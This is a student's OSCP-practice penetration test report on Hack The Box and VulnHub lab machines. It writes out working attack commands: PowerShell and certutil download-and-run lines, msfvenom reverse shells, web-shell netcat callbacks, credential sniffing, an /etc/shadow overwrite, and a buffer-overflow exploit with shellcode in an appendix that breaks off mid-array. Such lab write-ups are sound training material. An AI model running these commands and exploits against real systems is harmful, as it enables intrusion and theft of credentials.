---
title: "Penetration Test Report"
author: ["ceso@example.com", "OSID: EX-42"]
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Simulation"
lang: "en"
titlepage: true
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "360049"
titlepage-rule-height: 2
titlepage-background: "src/background.pdf"
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Offensive Security Simulation Penetration Test Report

## Introduction

This report is for the OSCP live simulation

```texinfo
https://www.youtube.com/watch?v=FwZc6JigIcE
```

that I did to practice for the OSCP exam.

Some screenshots of the attacker machine could have different IPs. This document has been modified over and over again, and even if in the real exam you can't re-do the machines to get the screenshots you didn't take, that's exactly which was the purpose of all this simulation, to learn what is a must to take (for example which screenshots yes/no), and learn of those mistakes to avoid them in the real exam, as to get a better idea on how the report should be.

## Objective

The objective of this assessment is to perform a simulation of the OSCP Exam.
The student is tasked with following a methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

## Requirements

The student will be required to fill out this penetration testing report fully and to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and root.txt if applicable
- Any additional items that were not included



# High-Level Summary

I was tasked with performing an internal penetration test towards Hack The Box and a VulnHub Machine.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Hack The Box pentest and VulnHub lab machines.
My overall objective was to evaluate the network, identify systems, and exploit flaws, generating a report of the findings.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on those Hack The Box machines as the VulnHub machine pentested.
When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
All systems were successfuly exploited, ending with access granted with administrative privileges.
These systems as well as a brief description on how access was obtained are listed below:

- 10.10.10.8 (optimum.htb) - Used public exploit to get remote command execution.
- 10.10.10.11 (arctic.htb) - Abused a public exploit to upload a reverse shell.
- 10.10.10.81 (bart.htb) - Poor PHP code abused to gain low privilege shell.
-  10.10.10.119 (lightweight.htb) - Abused public SSH user to gain low priv shell.
- 172.16.116.132 (brainpan) - BOF

## Recommendations

I recommend patching the vulnerabilities identified during the pentest in order to ensure an attacker will not be able to exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodologies

I utilized a widely adopted approach to performing penetration testing that is effective in testing how well Hack The Box machines and the VulnHub machine are secured.
Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Information Gathering

The information-gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, I was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

- 10.10.10.8
- 10.10.10.11
- 10.10.10.81
- 10.10.10.119
- 172.16.116.132

## Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems.
During this penetration test, I was able to successfully gain access to **5** out of the **5** systems.

### System IP: 10.10.10.8

#### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.8       | **TCP**: 80\
**UDP**: N/A

**Nmap Scan Results:**

```texinfo
kali@kali:~/simulation/optimum$ nmap -sC -sV -O -p- -oA nmap/full 10.10.10.8
----- snipped -----
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
----- snipped -----
```

**Vulnerability Explanation:** After some network enumeration, it was found the server was running Rejetto HTTP FileServer 2.3, which allowed to make use of CVE-2014-6287, a vulnerability that allows an attacker to have remote command execution via a 00% sequence in a search action in the remote system.

![rejetto 2.3](../optimum/screenshots/http-80-enum.png){ width=40% }

![Google search results](../optimum/screenshots/google-exploit.png){ width=80% }

**Vulnerability Fix:** Upgrade to a newer version of Rejetto as set proper permissions for the user used to run the server, as it is for example unable to write new files and/or execution of files besides the ones needed to start/stop the server.

**Severity:** \textcolor{red}{Critical}.

**Proof of Concept Code Here:** On the attacker machine was started a temporal web server using python, on another terminal a ncat listener was set up on port 443, and the public exploit (link below) associated to CVE-2014-6287 was executed, this lead to getting a reverse shell on the attacker machine from the victim.

Public exploit used:

```texinfo
https://www.exploit-db.com/exploits/39161
```

In the mentioned public exploit, the next lines:

```python
ip_addr = "192.168.44.128" #local IP address
local_port = "443" # Local Port number
```

where exchanged to:

```python
ip_addr = "10.10.10.14.57" #local IP address
local_port = "443" # Local Port number
```

**user.txt Proof Screenshot** N/A

![Reverse shell and user.txt](../optimum/screenshots/user-txt.png)

**user.txt Contents**

```texinfo
d0c3****************************
```

#### Privilege Escalation

**Vulnerability Exploited:** Kernel

**Vulnerability Explanation:** The system was found to be vulnerable to MS16-032, a kernel vulnerability which allows an attacker to escalate privileges by abusing the lack of sanitization of standard handles in Windows' Secondary Logon Service. Using a public exploit, it was possible to gain Administrator privileges.

**Vulnerability Fix:** Apply the patch 3143141 provided by Microsoft, and define a policy to keep the system updated with the last security patches.

**Severity:** \textcolor{red}{Critical}.

**Exploit Code:** Inside the low privilege shell with Powershell, Sherlock was downloaded from the attacker machine and executed, founding in the process the vulnerability:

```texinfo
powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.4/Sherlock.ps1')
```

![Vulnerable to MS16-032](../optimum/screenshots/sherlock.png)

In the attacker machine, a reverse shell was generated with:

```texinfo
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lport=443 lhost=10.10.14.4 exitfunc=thread -e x86/shikata_ga_nai -f exe -o reverse.exe
```

Afterwards, in the original exploit, the lines **189** and **333** with the content:

```powershell
0x00000002, "C:\Windows\System32\cmd.exe", "",
0x00000002, "C:\Windows\System32\cmd.exe", "",
```

Were exchanged for the next ones containing a mention to the reverse shell just created:

```powershell
0x00000002, "C:\Users\kostas\Desktop\reverse.exe", "",
0x00000002, "C:\Users\kostas\Desktop\reverse.exe", "",
```

The public exploit utilized, can be found in the following link:

```texinfo
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
```

Modified that, a listener was setup on the attacker machine on port 443 and the exploit was executed gaining with a reverse shell with Administrators' privileges.

**Proof Screenshot Here:**

![Reverse shell and root.txt](../optimum/screenshots/proof-pe.png)

**root.txt Contents:** 

```texinfo
51ed****************************
```

### System IP: 10.10.10.11

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.11       | **TCP**: 135, 8500, 49154\
**UDP**: N/A

**Nmap Scan Results:**

```texinfo
kali@kali:~/simulation/arctic$ nmap -Pn -sC -sV -O -p- -oA nmap/full 10.10.10.11
----- snipped -----
PORT   STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
----- snipped -----
```

**Vulnerability Explanation:** The server was found to be running Adobe Cold Fusion 8.0.1, this software/version is susceptible to the CVE-2009-2265, a vulnerability where an attacker can upload arbitrary files and execute them once uploaded.
By making use of a public exploit for this CVE, a low privilege shell was gain.

After network enumeration was conducted, manual web enumeration took place, finding with it the mentioned software-version.

![Directory listing](../artic/screenshots/web-enum1.png){ width=50% }

![Adobe Coldfusion dochome](../artic/screenshots/web-enum2.png){ width=70% }

![Directory listing CFIDE](../artic/screenshots/web-enum3.png){ width=70% }

![Adobe Coldfusion login](../artic/screenshots/web-enum4.png)

**Vulnerability Fix:** Upgrade of Adobe Cold Fusion to a newer version and hardening of permissions on the user running the service.

**Severity:** \textcolor{red}{Critical}.

**Proof of Concept Code Here:** On the attacker machine, in one terminal a reverse shell was generated and uploaded into the server by using the public exploit for CVE-2009-2265 (link below).

The code for the public exploit used can be found in the next link:

```texinfo
https://repo.theoremforge.com/pentesting/tools/blob/master/Uncategorized/exploit/windows/CVE-2009-2265_coldfusion.8.0.1/upload.py
```

Reverse shell is created and uploaded by using the exploit:

```texinfo
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -o reverse.jsp
python upload.py 10.10.10.11 8500 reverse.jsp
```

In a second terminal on the attacker machine, a listener on port 443 was started with:

```texinfo
sudo rlwrap ncat -lvnp 443
```

Finally, in a web browser on the search bar was entered the url the exploit gave as output:

```texinfo
http://10.10.10.11:8500/userfiles/file/exploit.jsp
```

![Reverse shell and user.txt](../artic/screenshots/local-proof.png){ width=70% }

**user.txt Proof Screenshot**

The screenshot proving this is in the section of privilege escalation.

**user.txt Contents**

```texinfo
0265****************************
```

#### Privilege Escalation

**Vulnerability Exploited:** Kernel.

**Vulnerability Explanation:** The low privilege user previously gain was found to have enabled `SeImpersonatePrivilege`, with it was possible to make use of a public exploit for MS16-075 (Aka RottenPotato), an exploit where is abused the way Windows handles authentication requests between services running on the same machine.
An updated variant of "RottenPotato" called "JuicyPotato" which works on newer systems was utilized.

The vulnerability was discovered by running:

```texinfo
C:\Users\tolis\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Vulnerability Fix:** Upgrade Windows to a newer version where the vulnerability has been patched.

**Severity:** \textcolor{red}{Critical}.

**Exploit Code:** To make use of JuicyPotato, first a reverse shell was generated and then the exploit `JuicyPotato-Static.exe` was downloaded in the attacker machine.

The exploit code used of JuicyPotato can be found in the following repository:

```texinfo
https://github.com/TsukiCTF/Lovely-Potato/blob/master/JuicyPotato-Static.exe
```

To generate the reverse shell, it was executed:

```texinfo
msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=10.10.14.4 LPORT=443 -f exe -o shell.exe
wget https://github.com/TsukiCTF/Lovely-Potato/raw/master/JuicyPotato-Static.exe
```

In another terminal in the attacker machine, a listener on port 443 was spined up as well:

```texinfo
sudo rlwrap ncat -lvnp 443
```

Later on a web server was started and from the compromised machine the reverse shell and exploit where downloaded, later on used by executing the following commands:

```texinfo
cd C:\users\tolis\desktop
certutil.exe -urlcache -split -f "http://10.10.14.4/reverse_shell.exe" reverse_shell.exe
certutil.exe -urlcache -split -f "http://10.10.14.4/JuicyPotato-Static.exe" JuicyPotato-Static.exe    
JuicyPotato-Static.exe -l 9999 -p c:\Windows\System32\cmd.exe -t * -c  {4991d34b-80a1-4291-83b6-3328366b9097} -a "/c c:\Users\tolis\Desktop\reverse_shell.exe"
```

**root.txt Contents:**

```texinfo
ce65****************************
```

![Reverse shell and root.txt](../artic/screenshots/root-proof.png){ width=70% }

### System IP: 10.10.10.81

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.81       | **TCP**: 80\
**UDP**: N/A

**Nmap Scan Results:**

```texinfo
kali@kali:~/simulation/bart$ nmap -Pn -sC -sV -O -p- -oA nmap/full 10.10.10.81
----- snipped -----
80/tcp open  http    Microsoft IIS httpd 10.0
----- snipped -----
```

**Vulnerability Explanation:** Simple chat had some of it's original code modified. Such modification has a vulnerability which allows an attacker to make a local file inclusion. With this is possible to do exfiltration of information, as to be able to get a reverse shell.

Some manual web enumeration was conducted, when was tried to enter to `http://10.10.10.81` a redirection to `http://forum.bart.htb` ocurred:

![Redirection forum.bart.htb](../bart/screenshots/webenum1.png)

An entry of `bart.htb` was saved inside `/etc/hosts` . Gobuster was run in mode of vhost bruteforcing, to verify if there was another subdomain, it was found `monitor.bart.htb`

```texinfo
kali@kali:~/simulation/bart$ gobuster vhost -u http://bart.htb -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt 
----- snipped -----
Found: forum.bart.htb (Status: 200) [Size: 35529]
Found: monitor.bart.htb (Status: 200) [Size: 3423]
----- snipped -----
```

This entries, `forum.bart.htb` and `monitor.bart.htb` were added as well inside `/etc/hosts` pointing to `10.10.10.81`.
In `forum.bart.htb` the next web page was found:

![forum.bart.htb](../bart/screenshots/webenum2.png)

After analyzing the source code of the page, a comment of a developer was found:

![Harvey commented code](../bart/screenshots/webenum3.png)

Notes on a user called `"Harvey Potter"` and an e-mail `h.potter@bart.htb` were taken.
It was noticed the server was running Wordpress 4.8.2:

![Wordpress 4.8.2](../bart/screenshots/wordpres.png){ width=50% }

`monitor.bart.htb`  was running `PHP Server Monitor 3.2.1`:

![Php server monitor 3.2.1](../bart/screenshots/webenum4.png)

Clicking on `Forgot Passowrd?` a redirection to a page with a textbox asking for a username was found, ingressing a random username, it throw an error saying the username didn't exist:

![username not found](../bart/screenshots/webenum5.png){ width=40% }

A try with the username `Harvey` found in the comments of `forum.bart.htb` was conducted, giving a success as user found:

![Harvey username found](../bart/screenshots/webenum6.png){ width=40% }

A login attempt as `Harvey` was made using obvious passwords, being in this case his last name; `"Potter"`.

![Harvey succesfull login](../bart/screenshots/webenum8.png)

Further click into Internal chat, it redirected to `internal-01.bart.htb`, this entry was also added inside `/etc/hosts`, once this was done, the following login page appeared:

![internal-01 login](../bart/screenshots/webenum9.png)

A quick search on google revealed the source code of this application was in the next repo on Github:

```texinfo
https://github.com/magkopian/php-ajax-simple-chat/
```

After examination of the source code, it was tried to access to:

```texinfo
http://internal-01.bart.htb/simple_chat/register.php
```

but this resulted in a redirection to:

```texinfo
http://internal-01.bart.htb/simple_chat/register_form.php
```

By analyzing the code of `register.php`, it was discovered it accepted two parameters: `uname` and `password`.

![uname and password parameter](../bart/screenshots/register.png){ width=70% }

From kali it was tried to create a user by executing a curl against `register.php`:

```texinfo 
curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d “uname=ceso&passwd=pelota123”
```

Having no errors, it was tried to login as the user:password just created, being this successful:

![internal-01 succesfull login](../bart/screenshots/login-chat.png)

**Vulnerability Fix:** Hardening of the vulnerable php code and/or deletion of it.

**Severity:** \textcolor{orange}{Medium}.

**Proof of Concept Code Here:** Once logged in, the source code of the page was reviewed and a vulnerability on it which allowed to do a local file inclusion was detected:

![Vulnerable php code](../bart/screenshots/vuln-bart.png)

As a POC of this vulnerability, first it was tried to do a local file inclusion of a file called phpinfo.txt, first it returned a `1` as specified in the vulnerable code showed before, meaning the execution was correct and the file was created, later the file was included:

![output_one](../bart/screenshots/poc-1.png)

![succesfull loca lfile inclusion](../bart/screenshots/poc-2.png)

Then, by using the Developer Tools on Firefox, the Header of the HTTP Request was modified in order to be able to do a log poisoning:

![http header modified](../bart/screenshots/poc-3.png){ width=60% }

Finally, using it:

![succesfull log posioning](../bart/screenshots/poc-4.png)

On one terminal of the attacker machine was started an http server:

```texinfo
sudo python3 -m http.server 80
```

By using the web browser, it was utilized the log poisoning to download `nc64.exe`, this was accomplished by making a request to the next url:

```texinfo
http://internal-01.bart.htb/log/ceso.php?cmd=certutil.exe%20-urlcache%20-split%20-f%20%22http://10.10.14.4/nc64.exe%22%20nc64.exe
```

Later, the reverse shell was executed by making another request to:

```texinfo
internal-01.bart.htb/log/ceso.php?cmd=nc64.exe%20-e%20cmd.exe%2010.10.14.4%20443
```

![Reverse shell as user](../bart/screenshots/1reverse.png){ width=60% }

**user.txt Proof Screenshot**

```texinfo
User without rights to read user.txt, showed in Privilege escalation section
```

**user.txt Contents**

```texinfo
User without rights to read user.txt, showed in Privilege escalation section
```

#### Privilege Escalation


**Vulnerability Exploited:** Plain text password stored in the registry.

**Vulnerability Explanation:** It was found the registry had stored in Plain text the password of the Administrators' user, by using this and a Powershell script  as "run-as", an attacker can execute arbitrary code on the system as the user Administrators'.
In this test it was executed a reverse shell.

![Administrators reg plaintext password](../bart/screenshots/admin-pass.png)

**Vulnerability Fix:** Delete the Administrators' Password from the Registry and keep a policy to not have them stored in plaintext and/or stored at all.

**Severity:** \textcolor{red}{Critical}.

**Exploit Code:** A temporal web server was and listener on port 443 were started up on the attacker machine, and by using the Run-As functionality from the OS plus the administrator credentials previously gathered, it was downloaded as administrator a Powershell reverse shell script from attacker machine, once it got in memory it created a reverse shell with full privileges against the attacker machine.

On a terminal on the attacker machine, an http server was started:

```texinfo
sudo python3 -m http.server 80
```

In parallel inside a second terminal on the attacker machine, a listener on port 443 was executed:

```texinfo
sudo rlwrap ncat -lvnp 443
```

The next line was added at the end of `Invoke-PowerShellTcp.ps1`:

```Powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 443
```

Finally a small script for "Run-As" was executed:

![Powershell run-as](../bart/screenshots/powershell-script.png)

The code for the Powershell reverse shell, can be found in the next link:

```texinfo
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```

**user.txt and root.txt Screenshot Here:**

![Reverse shell as administrator, user.txt and root.txt](../bart/screenshots/admin-shell.png){ width=60% }

**user.txt and root.txt Contents:**

```texinfo
user.txt:
625b****************************
```

```texinfo
root.txt
0074a****************************
```

### System IP: 10.10.10.119

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.119       | **TCP**: 22,80,389\
**UDP**: N/A

**Nmap Scan Results:**

```texinfo 
kali@kali:~/simulation/lightweight$ nmap -sC -sV -O -p- -oA nmap/full 10.10.10.119
----- snipped -----
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
----- snipped -----
```

**Vulnerability Explanation:** The server creates automatically an ssh user with the IP as user and password, this allows to get authenticated ssh access to any user on the server. Furthermore the binary`tcpdump` was found installed and with capabilities on it, specifically `cap_net_admin,cap_net_raw+ep`, this allows an attacker to execute `tcpdump` with root privileges allowing with it to sniff all the traffic going inside the server, which could lead to the discovering of unencrypted critical information as it's passwords.
By abusing the public ssh user and the capabilities on `tcpdump`, the unencrypted credentials of `ldapuser2` were found.

Once one enters the web page, by clicking on user, is showed information regardless the user automatically created:

![public ssh user](../lightweight/screenshots/web1.png)

**Vulnerability Fix:** Disable public ssh access, and fix misconfiguration on tcpdump.

**Severity:** \textcolor{orange}{Medium}.

**Proof of Concept Code Here:** A login with the IP as user:password was carried:

```texinfo
ssh 10.10.14.4@10.10.10.119
```

Inside the ssh session, a tcpdump capturing all the traffic on port `389 (LDAP)` was executed:

```texinfo
tcpdump -i any port 389 -w /tmp/capture.pcap`
```

After some minutes of tcpdump running, the capture was downloaded in the attacker machine with:

```texinfo
scp 10.10.14.4@10.10.10.119:/tmp/ceso.pcap .
```

By analyzing it with wireshark, it was found a plaintext password for the user `ldapuser2`:

![plaintext ldapuser2 password](../lightweight/screenshots/ldapuser2-cred.png)

With the password of `ldapuser2`, a login as this user was made.

**user.txt Proof Screenshot**

![ldapuser2 and user.txt](../lightweight/screenshots/usertxt.png)

**user.txt Contents**

```texinfo
8a86****************************
```

#### Privilege Escalation

**Vulnerability Exploited:** Misconfiguration of empty capabilities on binary `openssl`.

**Vulnerability Explanation:** In the home folder of `ldapuser2` was a file called `backup.7z` after cracking it, it was found the password for `ldapuser1`. This user (`ldapuser1`) had in it's home a binary of `openssl` misconfigured with empty capabilities, by taking advantage of this an attacker can read/write privileged files in order to escalate privileges to root user.

The program used to crack `backup.7z` can be found in the follow github repository: 

```texinfo
https://github.com/Goron/7zip-crack
```

In the home of `ldapuser2` existed a file called `backup.7z`, this file was downloaded and cracked:

![backup7z cracked](../lightweight/screenshots/crack-backup.png)

Inside this file was the password for `ldapuser1`:

![ldapuser1 password](../lightweight/screenshots/pass-ldapuser1.png){ width=60% }

In the home folder of `ldapuser1` was a binary `openssl` with empty capabilities:

![openssl empty capabilities](../lightweight/screenshots/opensslep.png){ width=60% }

**Vulnerability Fix:** Fix capabilities on openssl binary and/or delete it from the home folder of `ldapuser1`.

**Severity:** \textcolor{red}{Critical}.

**Exploit Code:** To gain root, it was abused the openssl binary with empty capabilities that was found on the home of `ldapuser1`, first it was tried to read the content of `/etc/shadow` as a POC in order to know if it was actually possible to read root files, being this succesfull, it was made a copy of it and a custom root password was generated and replaced on the copy of `/etc/shadow`, after this the original `/etc/shadow` was overwritten with the custom one, from this it was just loging as root with the custom password generated.

First it was created a self-signed `key.pem` and `cert.pem`:

```texinfo
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
```

Using them it was set up an HTTP server on port 1337:

```texinfo
~/openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
```

In parallel in another terminal, it was tried to read the contents of `/etc/shadow` by using the endpoint created above:

```texinfo
cd /
/home/ldapuser1/openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
```

Getting a success on it:

![poc shadow](../lightweight/screenshots/shadow.png)

The custom password for root was generated by running:

```texinfo
openssl passwd -6 -salt xyz pelota123
```

A custom `shadow` was created under `/tmp`, replacing the original password of root with the one generated above.
The custom `/tmp/shadow` was encrypted by executing:

```texinfo
cd /home/ldapuser1
openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem
```

Later, the custom `/tmp/shadow` was decrypted overwriting the original `/etc/shadow`:

```texinfo
cd /
/home/ldapuser1/openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/key.pem -out /etc/shadow
```

**Proof Screenshot Here:** 

![root.txt](../lightweight/screenshots/root-proof.png)

**root.txt Contents:**

```texinfo
f1d4****************************
```

### System IP: 172.16.116.132

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
172.16.116.132       | **TCP**: 9999,10000\
**UDP**: N/A

**Vulnerability Exploited: bof**

Brainpan.exe was loaded into ImmunityDebugger and started.

From the attacker machine, It's generated 2000 A by executing:

```texinfo
python -c 'print("A") * 2000'
```

And they are send:

![200 A crash](../brainpan/screenshots/crash02.png)

Resulting in a crash, it is possible to see EIP was overwritten with `41414141` (hex value for A):

![EIP ovewrriten A's](../brainpan/screenshots/crash03-01.png)

![Acces violation at 41414141](../brainpan/screenshots/crash03-02.png)

After this, it was tried to replicate the crash by fuzzing it, to know around which amount of bytes the crash took place, it was found around 700 bytes:

![Fuzzing detect bytes](../brainpan/screenshots/fuzzing-py.png){ width=50% }

After this, a pattern was created to find exactly at which offset of bytes the crash was taking place:

![Create pattern](../brainpan/screenshots/2-pattern-create.png)

EIP was overwritten with the value `35724135`:

![Pattern on EIP](../brainpan/screenshots/2-offset.png)

With this information, it was calculated at which byte the crash occurred:

![Offset found](../brainpan/screenshots/2-pattern-found.png){ width=50% }

From this, it was adjusted the exploit to send 524 A's as a filler followed with B's to check if control of EIP was possible, being this true (notice EIP was overwritten with `42424242` hex value of B):

![Control of EIP](../brainpan/screenshots/3.1-eip_control.png){ width=50% }

Afterwards, it was tested if there was enough space in the buffer for shellcode, this was achieved by putting 4 C's followed for the next value of D's

```python
buf = "D" * (2000 - len(filler) - len(eip) -len(offset))
```

Confirming there was enough space:

![Confirmed enough space](../brainpan/screenshots/3.5-enough_space.png)

It was tested if there were badchars (range from 00 to FF), `\x00` was found as the values after this got mangled:

![Found 00 as badchar](../brainpan/screenshots/4.1-badchars.png){ width=50% }

After some counting it was confirmed there wasn't any other badchar:

![No more badchars](../brainpan/screenshots/4.2-badchars.png){ width=50% }

From this on, by using `mona` and it's modules a search for where a `JMP ESP` address could be was done, after this was find as promising `0x311712F3`.
Some breakpoints where set, to test EIP was being overwritten with this address, this was successful (it can be noticed by checking how the value of EIP is the one early found):

![Finding unproteccted code](../brainpan/screenshots/5.1-return-modules.png)

![Found pointer JMP ESP](../brainpan/screenshots/5.2-return_address.png)

![Navigating to JMP ESP](../brainpan/screenshots/5.3-return_address.png)

![Breakpoint JMP ESP](../brainpan/screenshots/5.4-breakpoint.png)

![Succesfull Control JMP ESP](../brainpan/screenshots/5.5-breakpoint_success.png){ width=50% }

Stepping into the next address it can be seen how it was with `43434343` (hex value of C, the offset was being used):

![Cs doffset](../brainpan/screenshots/5.6-breakpoint_Cs.png){ width=50% }

From this on, was generated payload to pop-up a calc with msfvenom by running:

```texinfo
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/shikata_ga_nai -b "\x00" exitfunc=thread -f c
```

The shellcode generated from msfvenom was added in the script as shellcode, having before it 10 NOPs (hex value `\x90`), this to generate a NOP slide, with it achieving the encoder didn't override any shellcode when it was doing decoding of it, after this a calc successfully was poped-up:

![Pop calc.exe](../brainpan/screenshots/6-calc-without-func.png)

From this now, it was generated payload for a reverse shell with venom by running:

```texinfo
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lport=443 lhost=172.16.116.130 exitfunc=thread -b "\x00" -e x86/shikata_ga_nai -f c
```

The shellcode generated was exchanged with the one of the calc, a listener on the attacker machine was set up at port 443 and the exploit was executed again but with this new shellcode, successfully getting a reverse shell from it:

![Exploiting BOF Lab Machine](../brainpan/screenshots/10-exploit-1.png){ width=60% }

![Succesfull reverse shell](../brainpan/screenshots/10-exploit-2.png){ width=60% }

Finally, the crafted exploit was executed against brainpain (172.16.116.132), getting a reverse shell from it:

![Succesfull exploit Brainpan](../brainpan/screenshots/14-exploit.png){ width=60% }

**Proof Screenshot:**

```texinfo
N/A
```

**Completed Buffer Overflow Code:**

Please see Appendix 1 for the complete Windows Buffer Overflow code.

## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, ceso removed all user accounts, passwords and/or files downloaded in the systems that were needed during the pentest.



# Additional Items

## Appendix - Proof and Local Contents:

```python
     IP        |         user.txt Contents        |          root.txt Contents
---------------|----------------------------------|---------------------------------
10.10.10.8     | 8a86**************************** | 51ed****************************
10.10.10.11    | 0265**************************** | ce65c****************************
10.10.10.81    | 625b**************************** | 0074****************************
10.10.10.119   | 8a86**************************** | f1d4****************************
172.16.116.132 |               N/A                |                N/A
```

## Appendix - Metasploit/Meterpreter Usage

For the exam simulation, I haven't used my Metasploit/Meterpreter allowance.

## Appendix - Completed Buffer Overflow Code

```python
import socket
import sys
import time

if len(sys.argv) < 3:
    print("Usage: <script>.py <host> <port>")
    sys.exit()
host = sys.argv[1]
port = int(sys.argv[2])

try:
  filler = "A" * 524
  eip = "\xF3\x12\x17\x31"
  offset = "C" * 4
  nops = "\x90" * 10
## for poc:
##    msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/shikata_ga_nai -b "\x00" exitfunc=thread -f c
## for reverse:
## msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lport=443 lhost=172.16.116.130 exitfunc=thread -b "\x00" -e x86/shikata_ga_nai -f c   
  shellcode = ("\xdb\xd2\xb8\x9b\x94\x34\x9f\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x13\x03\xd8\x87\xd6\x6a\x22\x4f\x94"
"\x95\xda\x90\xf9\x1c\x3f\xa1\x39\x7a\x34\x92\x89\x08\x18\x1f"
"\x61\x5c\x88\x94\x07\x49\xbf\x1d\xad\xaf\x8e\x9e\x9e\x8c\x91"
"\x1c\xdd\xc0\x71\x1c\x2e\x15\x70\x59\x53\xd4\x20\x32\x1f\x4b"
"\xd4\x37\x55\x50\x5f\x0b\x7b\xd0\xbc\xdc\x7a\xf1\x13\x56\x25"
"\xd1\x92\xbb\x5d\x58\x8c\xd8\x58\x12\x27\x2a\x16\xa5\xe1\x62"
"\xd7\x0a\xcc\x4a\x2a\x52\x09\x6c\xd5\x21\x63\x8e\x68\x32\xb0"
"\xec\xb6\xb7\x22\x56\x3c\x6f\x8e\x66\x91\xf6\x45\x64\x5e\x7c"
"\x01\x69\x61\x51\x3a\x95\xea\x54\xec\x1f\xa8\x72\x28\x7b\x6a"
"\x1a\x69\x21\xdd\x23\x69\x8a\x82\x81\xe2\x27\xd6\xbb\xa9\x2f"
"\x1b\xf6\x51\xb0\x33\x81\x22\x82\x9c\x39\xac\xae\x55\xe4\x2b"
"\xd0\x4f\x50\xa3\x2f\x70\xa1\xea\xeb\x24\xf1\x84\xda\x44\x9a"
"\x54\xe2\x90\x0d\x04\x4c\x4b\xee\xf4\x2c\x3b\x86\x1e\xa3\x64"
"\xb6\x21\x69\x0d\x5d\xd8\xfa\x9e\xb2\x96\x78\xb6\xb0\x56\x7c"
"\xfc\x3c\xb0\x14\x12\x69\x6b\x81\x8b\x30\xe7\x30\x53\xef\x82"
"\x73\xdf\x1c\x73\x3d\x28\x68\x67\xaa\xd8\x27\xd5\x7d\xe6\x9d"
"\x71\xe1\x75\x7a\x81\x6c\x66\xd5\xd6\x39\x58\x2c\xb2\xd7\xc3"
"\x86\xa0\x25\x95\xe1\x60\xf2\x66\xef\x69\x77\xd2\xcb\x79\x41"
"\xdb\x57\x2d\x1d\x8a\x01\x9b\xdb\x64\xe0\x75\xb2\xdb\xaa\x11"
"\x43\x10\x6d\x67\x4c\x7d\x1b\x87\xfd\x28\x5a\xb8\x32\xbd\x6a"
